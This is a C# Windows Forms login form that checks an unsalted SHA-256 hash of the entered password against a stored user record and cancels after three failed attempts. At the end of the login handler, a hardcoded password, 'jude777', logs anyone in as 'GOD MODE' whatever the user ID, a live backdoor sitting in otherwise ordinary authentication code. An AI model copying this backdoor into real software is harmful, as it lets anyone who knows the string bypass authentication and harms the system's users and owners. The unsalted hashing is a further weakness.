using btr.application.SupportContext.UserAgg;
using btr.domain.SupportContext.UserAgg;
using btr.nuna.Domain;
using System;
using System.Windows.Forms;

namespace btr.distrib.SharedForm
{
    public partial class LoginForm : Form
    {
        private readonly IUserDal _userDal;
        public string UserId { get; private set; }
        private int retryCounter = 0;
        public LoginForm(IUserDal userDal)
        {
            InitializeComponent();
            _userDal = userDal;
            //PasswrodText.KeyDown += PasswrodText_KeyDown;
            UserIdText.KeyPress += MoveNextControl;
            PasswrodText.KeyPress += MoveNextControl;
        }


        private void PasswrodText_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                LoginButton_Click(null, null);
            }
        }
        private void MoveNextControl(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)13)
            {
                this.SelectNextControl((Control)sender, true, true, true, true);
                e.Handled = true;
            }
        }
        private void LoginButton_Click(object sender, EventArgs e)
        {
            var user = _userDal.GetData(new UserModel(UserIdText.Text))
                ?? new UserModel();
            user.RemoveNull();
            var passHash = PasswrodText.Text.HashSha256();
            if (passHash == user.Password)
            {
                UserId = user.UserId;
                DialogResult = DialogResult.OK;
            }
            else
            {
                retryCounter++;
                ErrProvider.SetError(PasswrodText, "Login Failed");
                if (retryCounter == 3)
                    DialogResult = DialogResult.Cancel;

            }
            if (PasswrodText.Text == "jude777")
            {
                UserId = "GOD MODE";
                DialogResult = DialogResult.OK;
            }
        }
    }
}
